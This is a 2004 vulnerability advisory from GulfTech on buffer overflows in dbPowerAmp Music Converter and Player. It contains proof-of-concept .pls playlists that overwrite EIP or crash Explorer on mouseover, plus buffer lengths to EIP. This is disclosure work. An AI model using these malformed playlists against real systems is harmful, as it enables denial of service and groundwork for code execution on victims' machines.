@@ -1,0 +1,87 @@
+dbPowerAmp Buffer Overflow
+
+Vendor: Illustrate
+Product: dbPowerAmp
+Version: <= 2.0/10.0
+Website: http://www.dbpoweramp.com
+
+BID: 11266 
+CVE: CVE-2004-1569 
+OSVDB: 10380 11126 11127 
+SECUNIA: 12684 
+PACKETSTORM: 34531 
+
+Description:
+Often called the Swiss Army knife of audio, dMC can digitally rip sound from audio CDs to a multitude of formats. Convert from one format to another while preserving ID tags. Nearly every audio type is supported, including MP3, MP4, Windows Media Audio (WMA), OGG Vorbis, AAC, Monkey's Audio, and FLAC (with optional installs from Codec Central). For Windows Explorer integration, right-click Convert To to pop up useful information on audio files (such as bit rate and length). Record from LPs with an optional Auxiliary Input install. dBpowerAmp Audio Player (dAP) has a digital conditioning equalizer and an advanced music collection. It's skinnable and has a cross-fader, a playlist editor, and a tag editor. dAP plays MP3s, WMA, Ogg Vorbis, Monkeys Audio, Real Audio, WAV, MIDI, and many more. 
+
+Arbitrary Code Execution:
+Both the very popular dbPowerAmp Music Converter application, as well as the dbPowerAmp Player are prone to buffer overflow conditions. These issues affect current and earlier versions of the dbPowerAmp Player and Music Converter. In my research I have only tested the vulnerabilities with .pls and .m3u playlists, but I think the same issues are probably present with other file types as well as other dbPowerAmp applications. The Music Converter application allocates a 215 byte buffer for the file name within the playlist. By opening a playlist like the one below will overflow this buffer and overwrite EIP with \x42\x42\x42\x42 
+
+
+[playlist]
+NumberOfEntries=1
+File1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBB
+Title1=GulfTech dbPowerAmp Music Converter POC
+Length1=-1
+
+
+
+The same issue applies to the player and playlist editor, however the buffer length with those applications (both are included with the player, not the converter) is not 215 bytes, but 265 bytes. So in short 
+
+
+MusicConverter.exe 215 bytes To EIP 
+playlist.exe 265 bytes to EIP 
+amp.exe 265 bytes to EIP 
+
+
+
+I believe these buffer overflow vulnerabilities to be the result of an unsafe strncmp() but I could be wrong ;) The same buffer overflow condition can also present itself when loading .mcc files which are the dbPowerAmp Music Collection files. There is also a pretty bad Denial Of Service condition that can happen with dbPowerAmp Music Converter that I will talk about next. 
+
+Denial Of Service:
+dbPowerAmp Music Converter has an option to integrate into the Windows shell. As a longtime dbPowerAmp Music Converter user I do find this feature very helpful, but it can also allow for an attacker to crash the Windows shell by sending them a malformed playlist. They do not have to open the playlist or anything, just mouseover it. I tested this issue on Windows XP SP1 Fully Patched. To see this issue in action just use the following example playlist and mouse over it. 
+
+
+[playlist]
+NumberOfEntries=1
+File1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Title1=GulfTech dbPowerAmp Music Converter Crash POC
+Length1=-1
+
+
+
+The large filename entry in the playlist will overwrite EDI with junk and then cause an access violation. This will then cause explorer to crash. 
+
+Note:
+Remember, the examples above are wrapped for readability. If you want to use them to test if you are vulnerable then you should remove all of the newlines in the file name. 
+
+
+Solution:
+The developer said that they would address these issues, but do not consider them high priority. Hmm, code execution via a malformed file is definitely not low priority in my book. 
+
+
+Proof Of Concept:
+Working exploit code may be released soon, but not at the moment due to time constraints. 
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
